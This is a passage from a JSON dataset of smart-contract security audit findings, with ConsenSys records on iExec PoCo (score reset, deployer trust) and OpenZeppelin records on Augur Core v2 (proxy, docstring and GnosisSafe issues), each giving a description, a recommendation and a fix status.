      "content": "#### Resolution\n\n\n\nUpdate from the iExec team: `Work in progress.`\n\n\n#### Description\n\n\nThere are many changes within the system from the initial version that are not reflected in the documentation.\n\n\nIt is necessary to have updated documentation for the time of the audit, as the specification dictates the correct behaviour of the code base.\n\n\n#### Examples\n\n\nEntities such as `iExecClerk` are the main point of entry in the documentation, however they have been replaced by proxy implementation in the code base (V5).\n\n\n#### Recommendation\n\n\nUp date documentation to reflect the recent changes and design in the code base.",
      "summary": "\nA bug report has been submitted regarding the need to update the documentation to reflect recent changes in the code base. The main point of entry in the documentation, `iExecClerk`, has been replaced by a proxy implementation in the code base (V5). The team is currently working on resolving this issue. It is important to update the documentation for the time of the audit, as the specification dictates the correct behaviour of the code base. To resolve this issue, it is recommended to update the documentation to reflect the recent changes and design in the code base.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "iExec PoCo",
      "source_link": "https://consensys.net/diligence/audits/2020/03/iexec-poco/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13757",
      "title": "importScore() in IexecMaintenanceDelegate can be used to wrongfully reset worker scores  Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nUpdate from the iExec team:\n\n\nIn order to perform this attack, one would first have to gain reputation on the new version, and lose it. They would then be able to restore its score from the old version.\n\n\nWe feel the risk is acceptable for a few reasons:\n\n\n* It can only be done once per worker\n* Considering the score dynamics discussed in the “Trust in the PoCo” document, it is more interesting for a worker to import its reputation in the beginning rather then creating a new one, since bad contributions only remove part of the reputation\n* Only a handful of workers have reputation in the old system (180), and their score is low (average 7, max 22)\n\n\nWe might force the import all 180 workers with reputation >0. A script to identify the relevant addresses is already available.\n\n\n\n\n#### Description\n\n\nThe import of worker scores from the previous PoCo system deployed on chain is made to be asynchronous. And, even though the pull pattern usually makes a system much more resilient, in this case, it opens up the possibility for an attack that undermines the trust-based game-theoretical balance the PoCo system relies on. As can be seen in the following function:\n\n\n**code/poco-dev/contracts/modules/delegates/IexecMaintenanceDelegate.sol:L51-L57**\n\n\n\n```\nfunction importScore(address \\_worker)\nexternal override\n{\n\trequire(!m\\_v3\\_scoreImported[\\_worker], \"score-already-imported\");\n\tm\\_workerScores[\\_worker] = m\\_workerScores[\\_worker].max(m\\_v3\\_iexecHub.viewScore(\\_worker));\n\tm\\_v3\\_scoreImported[\\_worker] = true;\n}\n\n```\nA motivated attacker could attack the system providing bogus results for computation tasks therefore reducing his own reputation (mirrored by the low worker score that would follow).\n\n\nAfter the fact, the attacker could reset its score to the previous high value attained in the previously deployed PoCo system (`v3`) and undo all the wrongdoings he had done at no reputational cost.\n\n\n#### Recommendation\n\n\nCheck that each worker interacting with the PoCo system has already imported his score. Otherwise import it synchronously with a call at the time of their first interaction.",
      "summary": "\nA motivated attacker could exploit the asynchronous import of worker scores from the previous PoCo system deployed on chain. This opens up the possibility of an attack that undermines the trust-based game-theoretical balance the PoCo system relies on. The attacker could provide bogus results for computation tasks in order to reduce their own reputation. After the fact, the attacker could reset their score to the previous high value attained in the previously deployed PoCo system and undo all the wrongdoings they had done at no reputational cost. The iExec team believes the risk is acceptable for a few reasons: it can only be done once per worker, it is more interesting to import reputation in the beginning than to create a new one, and only a handful of workers have reputation in the old system. To prevent this attack, it is recommended to check that each worker interacting with the PoCo system has already imported their score, or to import it synchronously with a call at the time of their first interaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "iExec PoCo",
      "source_link": "https://consensys.net/diligence/audits/2020/03/iexec-poco/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13756",
      "title": "System deployer is fully trusted in this version of the PoCo system  Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nUpdate from the iExec team:\n\n\nAfter deployment, ownership is planned to be transferred to a multisig.\nThis is just the first step towards a more decentralised governance on the protocol. We will consider adding an intermediary contract that enforces the lock period. This would however, prevent us from any kind of “emergency” update.\nThe long term goal is it involve the community in the process, using a DAO or a similar solution.\n\n\n\n\n#### Description\n\n\nThe introduction of ERC1538-compliant proxies to construct the PoCo system has many benefits. It heightens modularity, reduces the number of external calls between the system’s components and allows for easy expansion of the system’s capabilities without disruption of the service or need for off-chain infrastructure upgrade.\nHowever, the last enumerated benefit is in fact a double-edged sword.\n\n\nEven though ERC1538 enables easy upgradeability it also completely strips the PoCo system of all of its prior trustless nature. In this version the iExec development team should be entirely trusted by **every** actor in the system not to change the deployed on-chain delegates for new ones.\n\n\nAlso the deployer, `owner`, has permission to change some of the system variables, such as `m_callbackgas` for Oracle callback gas limit. This indirectly can lock the system, for example it could result in `IexecPocoDelegate.executeCallback()` reverting which prevents the finalization of corresponding task.\n\n\n#### Recommendation\n\n\nThe best, easiest solution for the trust issue would be to immediately revoke ownership of the proxy right after deployment. This way the modular deployment would still be possible but no power to change the deployed on-chain code would exist.\n\n\nA second best solution would be to force a timespan period before any change to the proxy methods (and its delegates) is made effective. This way any actor in the system can still monitor for possible changes and “leave” the system before they are implemented.\n\n\nIn this last option the “lock” period should, obviously, be greater than the amount of time it takes to verify a `Task` of the bigger category but it is advisable to decide on it by anthropomorphic rules and use a longer, “human-friendly” time lock of, for example, 72 hours.",
      "summary": "\nThe iExec team has identified an issue with the ERC1538-compliant proxies used to construct the PoCo system. While it allows for easy upgradeability, it also strips the system of its trustless nature, leaving it vulnerable to malicious actors. It is recommended that ownership of the proxy be immediately revoked after deployment, or that a timespan period be enforced before any changes to the proxy methods can be made effective. This would allow actors in the system to monitor changes and “leave” the system before they are implemented, with a “human-friendly” time lock of 72 hours being advised.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "iExec PoCo",
      "source_link": "https://consensys.net/diligence/audits/2020/03/iexec-poco/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "11498",
      "title": "[L11] Missing return value",
      "impact": "LOW",
      "content": "The [`doInitialReport` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L33) of the `WarpSync` contract is supposed to return a boolean but does not explicitly return a value. Consider including a `return` statement in the function.\n\n\n**Update**: *Fixed in [commit `8ca7638e`](https://github.com/AugurProject/augur/pull/5567/commits/8ca7638e3a259852990b492c067fd54cd9942059).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11497",
      "title": "[L10] Missing docstrings",
      "impact": "LOW",
      "content": "The [`GnosisSafeRegistry`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol), [`Affiliates`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Affiliates.sol), [`AffiliateValidator`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/AffiliateValidator.sol) and [`WarpSync`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol) contracts completely lack documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/v0.5.10/natspec-format.html) (NatSpec).\n\n\n**Update**: *Fixed in [commit `6e2c2558`](https://github.com/AugurProject/augur/pull/5567/commits/6e2c2558ba7653ca00a9e00901f7eb001df42e86). The documentation for these contracts has significantly improved.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11496",
      "title": "[L09] Missing error messages in require statements",
      "impact": "LOW",
      "content": "In the `Affiliates` contract, there is a [`require` statement without an error message](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Affiliates.sol#L22).\n\n\nIn the `Market` contract, most of the `require` statements do not include error messages. The only statements with error messages can be seen in lines [135](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L135) and [210](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L210).\n\n\nConsider always including specific and informative error messages in all `require` statements.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11495",
      "title": "[L08] Ownership transfer fails silently",
      "impact": "LOW",
      "content": "The [`transferOwnership` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/libraries/Ownable.sol#L39-L44) of the `Ownable` contract returns a boolean indicating if the transfer succeeds. However, it returns `true` in all cases, even when the `_newOwner` parameter is zero and the contract’s `owner` is not updated. Consider returning `false` in this scenario.\n\n\n**Update**: *Fixed in [commit `550a6511`](https://github.com/AugurProject/augur/pull/5567/commits/550a65111b0f065717bd6c7918a4802d8cc42a21).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11494",
      "title": "[L07] Undocumented assembly blocks",
      "impact": "LOW",
      "content": "The `Proxy` and `ProxyFactory` contracts include assembly blocks. See [lines 25 to 37](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L25-L37), [58 to 60](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L58-L60), [88 to 90](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L88-L90) and [104 to 106](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L104-L106) in `ProxyFactory.sol`. Taking the first case as example, on top of the `delegatecall`-related logic found in typical proxy contracts, the assembly block intends to build a public getter for the first slot of the contract’s storage (i.e., the [`masterCopy`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L8) internal state variable).\n\n\nAs this is a low-level language that is harder to parse by regular users, consider including extensive documentation regarding the rationale behind its use, clearly explaining what every single assembly instruction does. Clear documentation should make it easier for users to trust the code, for reviewers to verify it, and for developers to build on top of it or update it. As an example, refer to [OpenZeppelin’s SDK `Proxy` contract](https://github.com/OpenZeppelin/openzeppelin-sdk/blob/v2.6.0/packages/lib/contracts/upgradeability/Proxy.sol#L31-L48).\n\n\nNote that the use of assembly discards several important safety features of Solidity, which may render the code more error-prone. While no issues were identified in the audited version, consider implementing thorough tests to cover all potential use cases of these contracts to programmatically ensure they behave as expected, which should also help prevent introducing regression bugs in future modifications to the code base.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11493",
      "title": "[L06] Erroneous docstrings in Proxy contract",
      "impact": "LOW",
      "content": "The [docstrings](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L19) of the `Proxy` contract’s fallback function state that the function *“forwards all transactions”*. However, transactions [with calldata equal to `0xa619486e00000000000000000000000000000000000000000000000000000000`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L28-L30) (i.e., calling a `masterCopy()` getter) will not be forwarded to the `masterCopy` address.\n\n\nConsider modifying the function’s docstrings to correctly describe its exact behavior.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11492",
      "title": "[L05] Proxy deployment using create2 does not revert upon failure",
      "impact": "LOW",
      "content": "The [`deployProxyWithNonce` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L80) of the `ProxyFactory` contract does not revert the transaction when the [`create2` operation](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L89) fails. Depending on the `initializer` payload, this [may or may not cause the transaction to fail](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L102).\n\n\nFollowing the “fail early and loudly” principle, consider reverting the transaction when the address returned by `create2` is zero. For an example, refer to [OpenZeppelin’s SDK `ProxyFactory` contract](https://github.com/OpenZeppelin/openzeppelin-sdk/blob/v2.6.0/packages/lib/contracts/upgradeability/ProxyFactory.sol#L87-L90).\n\n\n**Update**: *Fixed in [commit `7787dba1`](https://github.com/AugurProject/augur/commit/7787dba1b0b0ba8b93e23e08be5540561c47dc6f#diff-7c400beb2b04aa551f558c2a76a864adR106).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11491",
      "title": "[L04] Different callers can deploy proxies to same address",
      "impact": "LOW",
      "content": "The [`deployProxyWithNonce` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L80) of the `ProxyFactory` contract does not use the `msg.sender` variable to [compute the salt](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L85) that is later [passed to `create2`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L89). As a consequence, two different callers can effectively deploy a proxy to the same address – potentially opening a race condition scenario should the [`saltNonce`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L79) have insufficient entropy.\n\n\nWhile this does not pose a security issue for Augur, consider either using `msg.sender` to calculate the salt or explicitly documenting this behavior in the docstrings of the `deployProxyWithNonce` function to avoid misuses. For an example of the former, refer to [OpenZeppelin’s SDK `ProxyFactory` contract](https://github.com/OpenZeppelin/openzeppelin-sdk/blob/v2.6.0/packages/lib/contracts/upgradeability/ProxyFactory.sol#L84).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11490",
      "title": "[L03] Warp Sync market finalization not recorded nor rewarded in migrated market",
      "impact": "LOW",
      "content": "When the Warp Sync market is finalized, the [`recordMarketFinalized` function of the `WarpSync` contract is called](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L54) to [reward the transaction sender](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L62) and to [update the `data` mapping](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L63-L64) with the latest values.\n\n\nHowever, if the market is migrated to a child universe and then finalized, [a consistency check in the `notifyMarketFinalized` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L50) will inevitably fail, thus never calling `recordMarketFinalized`. As a result, the finalization of the market is not going to be recorded in the `WarpSync` contract and the user that initiated the finalization transaction will not be rewarded.\n\n\nConsider handling the special case where a recurring market changes universe before it is finalized, or clearly documenting this behavior.\n\n\n**Update**: *Fixed in [commit `b95d70d7`](https://github.com/AugurProject/augur/pull/5567/commits/b95d70d77d8e6787abb921378f2513096bd1ad56). The WarpSync market can no longer migrate.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11489",
      "title": "[L02] Transfer of REP tokens to the zero address",
      "impact": "LOW",
      "content": "The [`transferRepBondOwnership` function of the `Market` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L752) does not prevent the new owner from being the zero address.\n\n\nIn this situation, an [initial report by the designated reporter](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L150) or a [fork migration](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L485) could cause a transfer of REP tokens to the zero address, thus bypassing a [restriction imposed by the `ERC777` specification](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/libraries/token/ERC777.sol#L113).\n\n\nConsider restricting the REP bond owner to non-zero addresses.\n\n\n**Update**: *Fixed in [commit `53a59728`](https://github.com/AugurProject/augur/commit/53a597281072dcede8ce917ea51b4c5b4ae6c337#diff-8ed676c60e9fab2fdbd79f09555a59be).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11488",
      "title": "[L01] GnosisSafe contract does not fully match known implementation",
      "impact": "LOW",
      "content": "Contracts in the [`GnosisSafe.sol` file](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol) do not entirely match any of the known implementations available in [Gnosis’s repository](https://github.com/gnosis/safe-contracts/tags). Augur’s `GnosisSafe` contract [claims to correspond to version 1.1.0](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L601), yet several differences with the [official 1.1.0 version](https://github.com/gnosis/safe-contracts/releases/tag/v1.1.0) were detected. Moreover, while the `GnosisSafe.sol` file [claims to have been verified in Etherscan on 2019-03-28](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L1-L3), that is the date when the `1.0.0` version of the official Gnosis Safe Multisig wallet was submitted for verification (see [code in Etherscan](https://etherscan.io/address/0xb6029EA3B2c51D09a50B53CA8012FeEB05bDa35A#code). The address was taken from [Gnosis’s v1.0.0 `zos.mainnet.json`](https://github.com/gnosis/safe-contracts/blob/v1.0.0/zos.mainnet.json#L4) file).\n\n\nFollowing we detail, for each contract in `GnosisSafe.sol`, which version matches (if any):\n\n\n* [`Enum` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L8): Augur’s implementation matches [v1.0.0](https://github.com/gnosis/safe-contracts/blob/v1.0.0/contracts/common/Enum.sol), not v1.1.0. [See differences between v1.0.0 and v1.1.0](https://github.com/gnosis/safe-contracts/compare/v1.0.0..v1.1.0?diff=split#diff-3348d8fb93c06d96f860a6047172e36b).\n* [`EtherPaymentFallback` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L17): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/common/EtherPaymentFallback.sol).\n* [`Executor` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L29): Augur’s implementation matches [v1.0.0](https://github.com/gnosis/safe-contracts/blob/v1.0.0/contracts/base/Executor.sol), not v1.1.0. [See differences between v1.0.0 and v1.1.0](https://github.com/gnosis/safe-contracts/compare/v1.0.0..v1.1.0?diff=split#diff-84b2520eaabbff02363b707ce2a57d6e).\n* [`SecuredTokenTransfer` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L80): Augur’s implementation matches [v1.0.0](https://github.com/gnosis/safe-contracts/blob/v1.0.0/contracts/common/SecuredTokenTransfer.sol), not v1.1.0. [See differences between v1.0.0 and v1.1.0](https://github.com/gnosis/safe-contracts/compare/v1.0.0..v1.1.0?diff=split#diff-74ef60297a673a9f9dea59759a35c019)\n* [`SelfAuthorized` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L105): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/common/SelfAuthorized.sol).\n* [`ModuleManager` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L113): Augur’s implementation matches [v1.0.0](https://github.com/gnosis/safe-contracts/blob/v1.0.0/contracts/base/ModuleManager.sol), not v1.1.0.  \n\n[See differences between v1.0.0 and v1.1.0](https://github.com/gnosis/safe-contracts/compare/v1.0.0..v1.1.0?diff=split#diff-906331fa104408184e67471856577847).\n* [`OwnerManager` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L209): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/base/OwnerManager.sol).\n* [`MasterCopy` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L370): Augur’s implementation matches [v1.0.0](https://github.com/gnosis/safe-contracts/blob/v1.0.0/contracts/common/MasterCopy.sol), not v1.1.0. [See differences between v1.0.0 and v1.1.0](https://github.com/gnosis/safe-contracts/compare/v1.0.0..v1.1.0?diff=split#diff-6e84cdd7b11e601b78f401db016ba857).\n* [`Module` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L388): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/base/Module.sol).\n* [`SignatureDecoder` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L408): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/common/SignatureDecoder.sol).\n* [`SafeMath` library](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L453): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/external/SafeMath.sol).\n* [`ISignatureValidatorConstants` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L514): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/interfaces/ISignatureValidator.sol#L3).\n* [`ISignatureValidator` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L520): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/interfaces/ISignatureValidator.sol#L8).\n* [`FallbackManager` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L540): Augur’s implementation matches [v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/base/FallbackManager.sol).\n* [`GnosisSafe` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L596): Augur’s implementation does not *fully* match any of the known versions. While the [`VERSION` claims to be 1.1.0](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L601), the contract’s code does not match the [official v1.1.0](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/GnosisSafe.sol). The most notable modifications from v1.1.0 are:\n* A new [`checkTransaction` private function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L715-L737) has been defined to replace the code block in [lines 122 to 133](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/GnosisSafe.sol#L122-L133).\n* A new [`executeTransaction` private function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L739-L766) was defined to replace the code block in lines [135 to 148](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/GnosisSafe.sol#L135-L148).\n* A [`require` statement that checked the gas left](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/GnosisSafe.sol#L134) in the transaction [has been commented out](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L708).\n* In the `checkSignatures` function, a [`require` statement](https://github.com/gnosis/safe-contracts/blob/v1.1.0/contracts/GnosisSafe.sol#L184-L187) to validate that the `threshold` state variable (inherited from the `OwnerManager` contract) was initialized (i.e., greater than zero) [has been removed](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L800).\n\n\nNote that the `GnosisSafe.sol` file was left out of the audit’s scope. We only checked for compliance with known implementations, but did not audit Augur’s implementation to verify functionality nor security. Consider either clearly documenting the above mentioned differences to raise awareness, or implementing a known non-modified version of the GnosisSafe wallet. Should Augur choose the latter, consider using [the latest GnosisSafe version (1.1.1)](https://github.com/gnosis/safe-contracts/releases/tag/v1.1.1).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11487",
      "title": "[M04] Lack of event emission",
      "impact": "MEDIUM",
